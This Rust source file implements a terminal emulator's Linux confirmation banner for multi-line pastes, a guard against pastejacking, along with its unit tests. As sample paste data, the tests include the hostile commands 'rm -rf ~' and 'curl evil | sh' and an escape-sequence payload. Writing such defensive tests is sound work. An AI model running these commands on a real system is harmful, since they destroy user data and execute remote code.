// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Andrew Yates

//! The Linux in-window MULTI-LINE-PASTE CONFIRMATION banner — the real confirm
//! behind the pastejacking guard on the platforms that have no native alert.
//!
//! macOS asks through a window sheet and Windows through a `MessageBoxW`; the
//! remaining platforms used to "ask" through a fallback that returned `true`
//! unconditionally, which made `confirm_multiline_paste = true` a silent no-op
//! exactly where the X11 clipboard makes pastejacking easiest (audit finding).
//! aterm composes its own chrome on Linux, so the confirmation is composed the
//! same way: the pending paste is PARKED on `App` ([`PendingPaste`]) — fail
//! closed, nothing reaches the PTY — and this banner is spliced over the top
//! grid rows (the retired config banner's band pattern) showing a short
//! sanitized PREVIEW of what is about to be pasted plus the two keys that
//! answer it. Enter delivers the parked text through the confirmed seam, Escape
//! (or a click on the banner) drops it. The keystroke decision reuses
//! [`crate::alert_keys::confirm_key`], the router the macOS sheet interceptor
//! answers through, so Enter and Escape mean the same on the band and the sheet.
//! (The Windows `MessageBoxW` is Yes/No and does not route keys through it.)
//!
//! Pure + geometry-injected like `link_target`: the row builder takes explicit
//! `cols`/`panel_rows` so it unit-tests without a window. Unlike the config
//! banner there is NO TTL — a security question does not answer itself — and no
//! auto-dismiss: the banner stands until a key or click answers it (the window
//! closing drops the parked text, which is the fail-closed answer).
//!
//! THE ANSWER IS BOUND TO THE SESSION THAT ASKED. The banner stands across event-
//! loop turns, and a mouse click on the tab bar or an `aterm ctl tab` can change
//! which session fronts the window while it does. The parked entry therefore
//! carries the session that owned the paste gesture, and Enter delivers to THAT
//! session — through the hidden-session seam if it is no longer in front — never
//! to whichever tab happens to be front when the answer arrives.

use aterm_core::terminal::RenderCell;
#[cfg(test)]
use aterm_render::Theme;

use crate::chrome_band;
use crate::settings::{blank_row, write_str};

/// Cap the banner height: 1 title row + up to [`MAX_PREVIEW_LINES`] preview rows
/// (the last of which becomes the "+N more" tally when the paste is longer), plus
/// one row for the answer keys when they do not fit beside the question.
const MAX_BANNER_ROWS: usize = 5;
/// How many lines of the pending paste are previewed at most.
const MAX_PREVIEW_LINES: usize = MAX_BANNER_ROWS - 1;

/// The banner's left margin and the preview's hanging indent, in cells
/// (mirrors `link_target`).
const MARGIN: usize = 2;
const PREVIEW_INDENT: usize = MARGIN + 2;

/// ONE parked multi-line paste awaiting the user's answer. Held by `App` in
/// `Option<PendingPaste>`: `Some` ⇔ the banner is up and an answer is owed,
/// which is what enforces "at most one confirmation at a time" (the macOS
/// sheet's rule). The TEXT lives here and nowhere else — dropping the entry IS
/// the cancel, so no exit path can leak an unconfirmed paste to the PTY.
pub(crate) struct PendingPaste {
    /// The window the paste targets — the banner splices into this window and
    /// only ITS keys answer it; the entry dies with the window.
    pub(crate) wid: crate::WindowId,
    /// The terminal session that fronted `wid` when the paste gesture happened —
    /// the one the question is ABOUT, and the only one the answer may reach.
    /// `None` when the window fronted no terminal (native content), in which
    /// case delivery keeps the ordinary front-content routing.
    pub(crate) session: Option<u64>,
    text: String,
    source: crate::input::Source,
    /// The DEC 2004 reading the QUESTION was asked under. Parked with the text
    /// because the answer lands later still (the ordered writer drains it), and
    /// a program on the other end can flip the mode while the banner stands: the
    /// paste must reach the PTY framed the way the banner said it would be.
    framing: crate::input::PasteFraming,
}

impl PendingPaste {
    // Built only by `present_multiline_paste_banner`, which is
    // `#[cfg(not(any(target_os = "macos", windows)))]`. `test` is in the set because
    // this module's own tests construct one on every platform.
    #[cfg(any(test, not(any(target_os = "macos", windows))))]
    pub(crate) fn new(
        wid: crate::WindowId,
        session: Option<u64>,
        text: String,
        source: crate::input::Source,
        framing: crate::input::PasteFraming,
    ) -> Self {
        Self {
            wid,
            session,
            text,
            source,
            framing,
        }
    }

    /// Surrender the parked paste for CONFIRMED delivery: the window, the owning
    /// session, the text, its source and the framing the question was asked under.
    pub(crate) fn take(
        self,
    ) -> (
        crate::WindowId,
        Option<u64>,
        String,
        crate::input::Source,
        crate::input::PasteFraming,
    ) {
        (self.wid, self.session, self.text, self.source, self.framing)
    }

    /// The parked text, for the row builder.
    pub(crate) fn text(&self) -> &str {
        &self.text
    }

    /// Rows the banner wants in a window `cols` wide: title + preview (capped at
    /// [`MAX_PREVIEW_LINES`]), plus a row for the answer keys when they do not fit
    /// beside the question, so a narrow window still previews every line it would.
    pub(crate) fn wanted_rows(&self, cols: usize) -> usize {
        let keys_row = usize::from(title_row(&self.text, cols).1.is_none());
        paste_lines(&self.text).len().min(MAX_PREVIEW_LINES) + 1 + keys_row
    }
}

/// `s` cut to `max` cells with a trailing ellipsis when it does not fit (the
/// `link_target` shape: a hard cut reads like corruption, an ellipsis says
/// "there is more"). The close-confirm panel cuts its lines with this too.
pub(crate) fn ellipsized(s: &str, max: usize) -> String {
    if max == 0 {
        return String::new();
    }
    if s.chars().count() <= max {
        return s.to_string();
    }
    let mut out: String = s.chars().take(max.saturating_sub(1)).collect();
    out.push('\u{2026}');
    out
}

/// One preview line with every CONTROL character replaced by a visible middle
/// dot. The paste body can carry ESC/C1 bytes and tabs a hostile clipboard put
/// there; the banner's whole point is showing the user what is REALLY on the
/// clipboard, and a control byte must neither corrupt the chrome band cells
/// (`write_str` writes one char per cell) nor render as nothing.
fn sanitized(line: &str) -> String {
    line.chars()
        .map(|c| if c.is_control() { '\u{00b7}' } else { c })
        .collect()
}

/// The two keys that answer the question, right-aligned on the title row and
/// spoken as the a11y question's description. `pub(crate)` and named once: the
/// banner a sighted user reads and the alert a screen reader hears must offer
/// the SAME two answers, and a second literal is how they stop doing that.
pub(crate) const ANSWER_KEYS: &str = "Enter pastes \u{00b7} Esc cancels";

/// [`ANSWER_KEYS`] for a window too narrow to carry the verbs beside the question.
const ANSWER_KEYS_SHORT: &str = "Enter \u{00b7} Esc";

/// Why the paste is asked about: the guard fires only when bracketed paste is off,
/// so each line end submits. Named once for the band, its announcement, the macOS
/// sheet and the Windows dialog.
pub(crate) const RISK: &str = "Each line may run as a command.";

/// The accessible alert's description: the risk, then the answer keys. One builder
/// for the announcement and its test.
#[cfg(a11y_tree)]
pub(crate) fn announcement_detail() -> String {
    format!("{RISK} {ANSWER_KEYS}")
}

/// Row 0's title and the answer keys that fit beside it in `cols`: the risk goes
/// first, then the verbs; `None` when even the short keys do not fit, and they take
/// a row of their own. [`banner_rows`] paints by it and
/// [`PendingPaste::wanted_rows`] sizes by it, so the two agree.
fn title_row(text: &str, cols: usize) -> (String, Option<&'static str>) {
    let question = format!("!  {}", question(text));
    let with_risk = format!("{question}  {RISK}");
    let fits = |title: &str, keys: &str| {
        cols.saturating_sub(keys.chars().count() + MARGIN) > MARGIN + title.chars().count() + 2
    };
    if fits(&with_risk, ANSWER_KEYS) {
        return (with_risk, Some(ANSWER_KEYS));
    }
    let keys = [ANSWER_KEYS, ANSWER_KEYS_SHORT]
        .into_iter()
        .find(|keys| fits(&question, keys));
    (question, keys)
}

/// The QUESTION the banner asks about `text`, as one sentence.
///
/// The title row's words and the accessible alert's name come from here, so the
/// pixels and the announcement cannot claim a different number of lines. Words
/// only: the painted warn mark is added by [`banner_rows`].
pub(crate) fn question(text: &str) -> String {
    format!("Paste {}?", lines_words(paste_lines(text).len()))
}

/// `1 line` / `N lines`: the count every confirmation names (the banner, the
/// macOS sheet, the Windows dialog). One command plus its newline asks too
/// when the paste is unbracketed, and "Paste 1 lines?" is not a question.
pub(crate) fn lines_words(n: usize) -> String {
    if n == 1 {
        "1 line".to_string()
    } else {
        format!("{n} lines")
    }
}

/// The lines a paste would enter, split the way a shell reads them: LF, CRLF
/// and a lone CR each end one. One trailing line end is not a line of its own
/// (`make test\n` is one line, which its newline submits).
pub(crate) fn paste_lines(text: &str) -> Vec<&str> {
    if text.is_empty() {
        return Vec::new();
    }
    let body = text.strip_suffix('\n').unwrap_or(text);
    let body = body.strip_suffix('\r').unwrap_or(body);
    let mut parts = body.split('\n').peekable();
    let mut lines = Vec::new();
    while let Some(line) = parts.next() {
        // A CR is half of a CRLF only when an LF followed it; the last
        // segment's trailing CR ends a line of its own.
        let line = if parts.peek().is_some() {
            line.strip_suffix('\r').unwrap_or(line)
        } else {
            line
        };
        lines.extend(line.split('\r'));
    }
    lines
}

/// PURE grid-cell row builder: exactly `panel_rows` rows, each exactly `cols`
/// wide, so the splice overwrites frame rows in place (the retired config banner's
/// contract). Row 0 carries the question ([`question`]) with the two answer keys
/// ([`ANSWER_KEYS`]) right-aligned; the following rows preview the paste body,
/// sanitized and ellipsized, with a "+N more lines" tally when it overflows.
pub(crate) fn banner_rows(
    text: &str,
    cols: usize,
    panel_rows: usize,
    palette: impl Into<chrome_band::ChromePalette>,
) -> Vec<Vec<RenderCell>> {
    let c = chrome_band::band_colors(palette);
    let mut rows: Vec<Vec<RenderCell>> = (0..panel_rows)
        .map(|r| blank_row(cols, c.label, c.bar_bg, r == 0))
        .collect();
    if panel_rows == 0 {
        return rows;
    }
    let lines = paste_lines(text);
    let (title, row0_keys) = title_row(text, cols);
    // `value` (not the dim `label`): the answer keys are not an aside — they are
    // the only way to answer (every other key is swallowed), so they read at full
    // tone and never drop.
    let mut first_preview = 1;
    if let Some(keys) = row0_keys {
        write_str(&mut rows[0], cols, MARGIN, &title, c.warn, c.bar_bg, true);
        let keys_col = cols.saturating_sub(keys.chars().count() + MARGIN);
        write_str(&mut rows[0], cols, keys_col, keys, c.value, c.bar_bg, true);
    } else if panel_rows > 1 {
        write_str(&mut rows[0], cols, MARGIN, &title, c.warn, c.bar_bg, true);
        let keys = if ANSWER_KEYS.chars().count() + 2 * MARGIN <= cols {
            ANSWER_KEYS
        } else {
            ANSWER_KEYS_SHORT
        };
        write_str(&mut rows[1], cols, MARGIN, keys, c.value, c.bar_bg, true);
        first_preview = 2;
    } else {
        // One row and no room for both: the keys keep their place at the right
        // and the question is cut to what is left.
        let keys_col = cols.saturating_sub(ANSWER_KEYS_SHORT.chars().count() + MARGIN);
        let title = ellipsized(&title, keys_col.saturating_sub(MARGIN + 1));
        write_str(&mut rows[0], cols, MARGIN, &title, c.warn, c.bar_bg, true);
        write_str(
            &mut rows[0],
            cols,
            keys_col,
            ANSWER_KEYS_SHORT,
            c.value,
            c.bar_bg,
            true,
        );
    }

    // Preview capacity: every row after the title (and the keys, when they took a
    // row), reserving the last for the "+N more" tally when the paste overflows
    // and there is room to say so.
    let capacity = panel_rows.saturating_sub(first_preview);
    let overflow = lines.len() > capacity;
    let shown = if overflow && capacity >= 2 {
        capacity - 1
    } else {
        capacity
    };
    let text_w = cols.saturating_sub(PREVIEW_INDENT + MARGIN);
    for (i, line) in lines.iter().take(shown).enumerate() {
        write_str(
            &mut rows[first_preview + i],
            cols,
            MARGIN,
            "\u{2502}",
            c.label,
            c.bar_bg,
            false,
        );
        write_str(
            &mut rows[first_preview + i],
            cols,
            PREVIEW_INDENT,
            &ellipsized(&sanitized(line), text_w),
            c.value,
            c.bar_bg,
            false,
        );
    }
    if overflow && shown < capacity {
        let more = format!("+{} more lines", lines.len() - shown);
        write_str(
            &mut rows[first_preview + shown],
            cols,
            PREVIEW_INDENT,
            &ellipsized(&more, text_w),
            c.label,
            c.bar_bg,
            false,
        );
    }
    // THE SEAM IS THE WHOLE EDGE, AND ONE TONE — the contract this
    // builder's header claims, which it was not actually keeping. The question and
    // the answer keys are written over the row `blank_row` seamed, and `write_str`
    // rebuilds each cell without an overline, so the band's top edge arrived as
    // stubs. Closed here, in the label tone: the row carries the warn title and the
    // full-tone answer keys, and the rule belongs to neither of them.
    chrome_band::seal_band_top(&mut rows[0], c.seam);
    rows
}

#[cfg(test)]
mod tests {
    use super::*;

    fn text_of(row: &[RenderCell]) -> String {
        row.iter().map(|cell| cell.ch).collect()
    }

    /// A lone CR submits a line at a bare prompt, which is why the guard asks
    /// about it, so the count and the preview split on it too.
    #[test]
    fn a_lone_carriage_return_counts_as_a_line() {
        assert_eq!(question("echo a\recho b"), "Paste 2 lines?");
        assert_eq!(question("a\r\nb\r\n"), "Paste 2 lines?");
        assert_eq!(question("a\nb\n"), "Paste 2 lines?");
        // The guard asks about these, so the count must not read 1; CR and LF
        // forms of the same text count alike.
        assert_eq!(question("a\r\r"), "Paste 2 lines?");
        assert_eq!(question("a\rb\r\r"), "Paste 3 lines?");
        assert_eq!(question("a\nb\n\n"), "Paste 3 lines?");
        // One command plus its newline is asked about when unbracketed.
        assert_eq!(question("make test\n"), "Paste 1 line?");
        let rows = banner_rows("echo a\recho b", 80, 3, Theme::default());
        assert!(
            text_of(&rows[1]).contains("echo a"),
            "{:?}",
            text_of(&rows[1])
        );
        assert!(
            text_of(&rows[2]).contains("echo b"),
            "{:?}",
            text_of(&rows[2])
        );
    }

    /// THE SEAM IS THE BAND'S TOP EDGE, so it must run the whole width. It did not:
    /// this builder inherited the retired config banner's band pattern its header names, and
    /// the same hole with it — `blank_row` stamps the rule, then the question and the
    /// answer keys punch themselves out of it (`write_str` rebuilds every cell it
    /// touches with no overline), leaving three stubs where a boundary belongs. A
    /// security question is the last band that should look half-drawn.
    #[test]
    fn the_seam_runs_unbroken_and_one_toned_across_the_question_row() {
        let theme = Theme::default();
        let rows = banner_rows("ls\nrm -rf ~", 80, 3, theme);
        let question = &rows[0];
        assert!(
            question.iter().all(|cell| cell.overline),
            "the seam breaks at columns {:?}",
            question
                .iter()
                .enumerate()
                .filter(|(_, cell)| !cell.overline)
                .map(|(col, _)| col)
                .collect::<Vec<_>>()
        );
        // AND IT IS ONE TONE. The row carries the warn-coloured question beside the
        // full-tone answer keys, so a seam left to each cell's `fg` would change colour
        // twice along a single hairline.
        let seams: std::collections::BTreeSet<Option<[u8; 3]>> =
            question.iter().map(|cell| cell.overline_color).collect();
        assert_eq!(
            seams.len(),
            1,
            "the rule takes as many tones as the band has inks: {seams:?}"
        );
        assert!(
            seams.iter().all(Option::is_some),
            "an uncoloured seam falls back to its cell's ink: {seams:?}"
        );
        let inks: std::collections::BTreeSet<[u8; 3]> =
            question.iter().map(|cell| cell.fg).collect();
        assert!(
            inks.len() > 1,
            "the question row is meant to carry two inks, so this proof is not vacuous: {inks:?}"
        );
        // ONLY the top row is an edge; the preview rows sit inside the band.
        assert!(rows[1].iter().all(|cell| !cell.overline));
    }

    /// A CAPPED PREVIEW MUST SAY IT IS CAPPED — five shown lines with no tally
    /// reads as "that is the whole paste", which defeats the preview's purpose.
    #[test]
    fn an_overflowing_paste_counts_what_it_hid() {
        let text: String = (0..20)
            .map(|i| format!("line {i}\n"))
            .collect::<Vec<_>>()
            .join("");
        let pending = PendingPaste::new(
            crate::WindowId(0),
            Some(11),
            text.clone(),
            test_source(),
            test_framing(),
        );
        assert_eq!(pending.wanted_rows(80), MAX_BANNER_ROWS);
        let rows = banner_rows(&text, 80, MAX_BANNER_ROWS, Theme::default());
        let last = text_of(&rows[MAX_BANNER_ROWS - 1]);
        // 5 rows = title + 3 preview lines + the tally for the remaining 17.
        assert!(last.contains("+17 more lines"), "{last:?}");
        assert!(text_of(&rows[3]).contains("line 2"), "three lines shown");
    }

    /// THE PREVIEW IS THE SECURITY SURFACE: a hidden control byte (the exact
    /// pastejacking payload — ESC, C1, a bare CR) must show up as a visible
    /// mark, never vanish or write outside its own cell.
    #[test]
    fn control_bytes_in_the_preview_become_visible_marks() {
        let rows = banner_rows("safe\u{1b}[31mred\ttab", 80, 2, Theme::default());
        let row1 = text_of(&rows[1]);
        assert!(row1.contains("safe\u{00b7}[31mred\u{00b7}tab"), "{row1:?}");
    }

    /// Degenerate geometry must not panic: zero columns, one row, a paste line
    /// wider than the window.
    #[test]
    fn degenerate_geometry_never_panics() {
        for cols in [0_usize, 1, 3, 8, 200] {
            for panel_rows in [0_usize, 1, 2, MAX_BANNER_ROWS] {
                let text = format!("{}\nb\nc", "y".repeat(300));
                let rows = banner_rows(&text, cols, panel_rows, Theme::default());
                assert_eq!(rows.len(), panel_rows);
                for row in &rows {
                    assert_eq!(row.len(), cols);
                }
            }
        }
    }

    /// A NARROW WINDOW STILL SHOWS THE ANSWER. The band swallows every other key,
    /// so a question without its keys has no visible way out.
    #[test]
    fn a_narrow_band_keeps_the_answer_keys() {
        let text = "ls\nrm -rf ~\ncurl evil | sh";
        for cols in [24_usize, 40] {
            let rows = banner_rows(text, cols, 4, Theme::default());
            let shown = format!("{}{}", text_of(&rows[0]), text_of(&rows[1]));
            assert!(
                shown.contains("Enter") && shown.contains("Esc"),
                "{cols} cols: {shown:?}"
            );
        }
        // Too narrow for even the short keys beside the question: they take row 1,
        // the band grows by that row, and every line is still previewed.
        let pending = PendingPaste::new(
            crate::WindowId(0),
            Some(11),
            text.into(),
            test_source(),
            test_framing(),
        );
        assert_eq!(pending.wanted_rows(24), 5);
        let rows = banner_rows(text, 24, 5, Theme::default());
        assert!(
            text_of(&rows[1]).contains("Enter"),
            "{:?}",
            text_of(&rows[1])
        );
        assert!(text_of(&rows[2]).contains("ls"), "{:?}", text_of(&rows[2]));
        assert!(
            text_of(&rows[4]).contains("curl"),
            "{:?}",
            text_of(&rows[4])
        );
        // One command plus its newline is asked about, so it is shown too.
        let one = PendingPaste::new(
            crate::WindowId(0),
            Some(11),
            "make test\n".into(),
            test_source(),
            test_framing(),
        );
        assert_eq!(one.wanted_rows(24), 3);
        let rows = banner_rows(one.text(), 24, 3, Theme::default());
        assert!(
            text_of(&rows[2]).contains("make test"),
            "{:?}",
            text_of(&rows[2])
        );
        // A one-row band keeps the keys and cuts the question.
        let row0 = text_of(&banner_rows(text, 24, 1, Theme::default())[0]);
        assert!(row0.contains("Enter") && row0.contains("Esc"), "{row0:?}");
    }

    fn test_source() -> crate::input::Source {
        crate::input::Source::Human
    }

    fn test_framing() -> crate::input::PasteFraming {
        crate::input::PasteFraming::Gesture { bracketed: false }
    }
}
